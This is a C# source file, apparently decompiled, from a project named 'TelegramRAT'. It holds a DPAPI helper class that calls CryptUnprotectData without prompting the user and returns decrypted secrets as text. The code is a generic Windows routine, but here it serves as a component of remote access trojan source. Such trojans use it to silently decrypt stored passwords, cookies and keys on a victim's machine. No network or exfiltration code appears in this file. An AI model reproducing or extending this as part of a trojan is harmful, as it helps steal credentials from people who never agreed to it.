using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace TelegramRAT;

internal class DPAPI
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public int dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	private static IntPtr NullPtr = (IntPtr)0;

	private const int CRYPTPROTECT_UI_FORBIDDEN = 1;

	private const int CRYPTPROTECT_LOCAL_MACHINE = 4;

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy, IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

	private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
	{
		ps.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
		ps.dwPromptFlags = 0;
		ps.hwndApp = NullPtr;
		ps.szPrompt = null;
	}

	private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
	{
		if (data == null)
		{
			data = new byte[0];
		}
		blob.pbData = Marshal.AllocHGlobal(data.Length);
		if (blob.pbData == IntPtr.Zero)
		{
			throw new Exception("Unable to allocate data buffer for BLOB structure.");
		}
		blob.cbData = data.Length;
		Marshal.Copy(data, 0, blob.pbData, data.Length);
	}

	public static string Decrypt(string cipherText)
	{
		string description;
		return Decrypt(cipherText, string.Empty, out description);
	}

	public static string Decrypt(string cipherText, out string description)
	{
		return Decrypt(cipherText, string.Empty, out description);
	}

	public static string Decrypt(string cipherText, string entropy, out string description)
	{
		if (entropy == null)
		{
			entropy = string.Empty;
		}
		return Encoding.UTF8.GetString(Decrypt(Convert.FromBase64String(cipherText), Encoding.UTF8.GetBytes(entropy), out description));
	}

	public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
	{
		DATA_BLOB pPlainText = default(DATA_BLOB);
		DATA_BLOB blob = default(DATA_BLOB);
		DATA_BLOB blob2 = default(DATA_BLOB);
		CRYPTPROTECT_PROMPTSTRUCT ps = default(CRYPTPROTECT_PROMPTSTRUCT);
		InitPrompt(ref ps);
		description = string.Empty;
		try
		{
			try
			{
				InitBLOB(cipherTextBytes, ref blob);
			}
			catch (Exception innerException)
			{
				throw new Exception("Cannot initialize ciphertext BLOB.", innerException);
			}
			try
			{
				InitBLOB(entropyBytes, ref blob2);
			}
			catch (Exception innerException2)
			{
				throw new Exception("Cannot initialize entropy BLOB.", innerException2);
			}
			if (!CryptUnprotectData(ref blob, ref description, ref blob2, IntPtr.Zero, ref ps, 1, ref pPlainText))
			{
				int lastWin32Error = Marshal.GetLastWin32Error();
				throw new Exception("CryptUnprotectData failed.", new Win32Exception(lastWin32Error));
			}
			byte[] array = new byte[pPlainText.cbData];
			Marshal.Copy(pPlainText.pbData, array, 0, pPlainText.cbData);
			return array;
		}
		catch (Exception innerException3)
		{
			throw new Exception("DPAPI was unable to decrypt data.", innerException3);
		}
		finally
		{
			if (pPlainText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pPlainText.pbData);
			}
			if (blob.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(blob.pbData);
			}
			if (blob2.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(blob2.pbData);
			}
		}
	}
}
